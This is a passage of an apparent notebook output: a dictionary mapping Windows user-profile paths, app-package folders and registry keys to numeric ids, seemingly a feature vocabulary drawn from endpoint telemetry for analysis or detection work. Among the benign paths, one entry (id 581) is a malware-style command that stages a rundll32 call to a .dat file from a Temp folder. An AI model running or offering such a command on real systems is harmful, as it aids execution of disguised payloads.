       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 448,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\uk': 449,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache': 450,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 451,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\RoamingState\\\\*': 452,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ca': 453,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\crashes\\\\.git': 454,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\bg-BG\\\\*': 455,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 456,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-OM\\\\.git': 457,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\LocalState\\\\*': 458,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\he\\\\*': 459,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Google\\\\.git': 460,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\.git': 461,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\.git': 462,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\LocalCache\\\\*': 463,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Media Player\\\\.git': 464,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Crash Reports\\\\*': 465,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\en': 466,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\A80FBT22\\\\.git': 467,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\archived\\\\.git': 468,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\*': 469,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 470,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\LocalCache': 471,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\is\\\\*': 472,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\Contacts\\\\.git': 473,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 474,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\Settings': 475,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Network Shortcuts\\\\*': 476,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 477,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\*': 478,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb': 479,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Microsoft\\\\PlayReady\\\\Internet Explorer\\\\InPrivate\\\\.git': 480,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState': 481,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 482,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings\\\\.git': 483,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 484,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\LogoImages': 485,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 486,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 487,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Roaming\\\\Mozilla\\\\Extensions': 488,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\CloudStore\\\\.git': 489,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{A990AE9F-A03B-4e80-94BC-9912D7504104}\\\\DefinitionFlags': 490,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows Sidebar\\\\Gadgets\\\\.git': 491,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\Settings\\\\.git': 492,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\CloudStore\\\\*': 493,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\.git': 494,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD\\\\scripts': 495,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 496,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AppData\\\\*': 497,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AppData\\\\.git': 498,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.3_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 499,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData': 500,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 501,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\AutoLaunchProtocolsComponent\\\\.git': 502,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\*': 503,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Temp\\\\vmware-dkelly\\\\*': 504,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Feature Engagement Tracker\\\\AvailabilityDB\\\\.git': 505,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\*': 506,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 507,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group2\\\\.git': 508,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\Update\\\\*': 509,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\js\\\\.git': 510,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\Settings': 511,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 512,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalCache\\\\*': 513,\n",
       " 'HKCR\\\\CLSID\\\\{06EEE834-461C-42c2-8DCF-1502B527B1F9}\\\\InProcServer32\\\\ThreadingModel': 514,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState': 515,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\GPUCache': 516,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\LocalState': 517,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\Searches': 518,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\sl': 519,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Crashpad': 520,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\fr': 521,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetHistory': 522,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 523,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\.git': 524,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\nl-BE\\\\*': 525,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 526,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 527,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\*': 528,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\zh_TW\\\\*': 529,\n",
       " 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Core\\\\dbf675a2e7564fd29ec8b82b29a1a2fe\\\\System.Core.ni.dll.aux': 530,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates': 531,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 532,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\MaxObjectNumber': 533,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Accessories': 534,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 535,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 536,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\bg\\\\.git': 537,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-029\\\\*': 538,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AppData\\\\.git': 539,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\wasm\\\\*': 540,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 541,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 542,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 543,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-SY\\\\*': 544,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\LocalState': 545,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\Temp': 546,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.WindowsFeedbackHub_1.2106.1801.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities': 547,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 548,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 549,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC': 550,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp': 551,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 552,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\TempState\\\\.git': 553,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 554,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 555,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 556,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-LU': 557,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 558,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 559,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR': 560,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState\\\\.git': 561,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{6f0ed44a-72bc-450e-b61d-7995493fee62}\\\\.git': 562,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState': 563,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\Sessions\\\\*': 564,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt\\\\.git': 565,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Roaming\\\\Microsoft\\\\MMC\\\\*': 566,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mt-MT\\\\.git': 567,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-SN\\\\.git': 568,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 569,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af': 570,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell': 571,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\LocalCache': 572,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-BH': 573,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\r7js9xmv.default\\\\.git': 574,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\th\\\\.git': 575,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 576,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\*': 577,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 578,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\Settings': 579,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 580,\n",
       " 'echo rundll32.exe  C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\htpd.dat, bogus > C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\WIKWAFRE\\\\f[1].txt': 581,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 582,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\*': 583,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\fi\\\\.git': 584,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 585,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\TempState\\\\.git': 586,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\1033': 587,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\lv\\\\*': 588,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 589,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 590,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalState\\\\*': 591,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetCache': 592,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*': 593,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\hr\\\\*': 594,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 595,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\es\\\\*': 596,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 597,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 598,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 599,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 600,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 601,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\de': 602,\n",
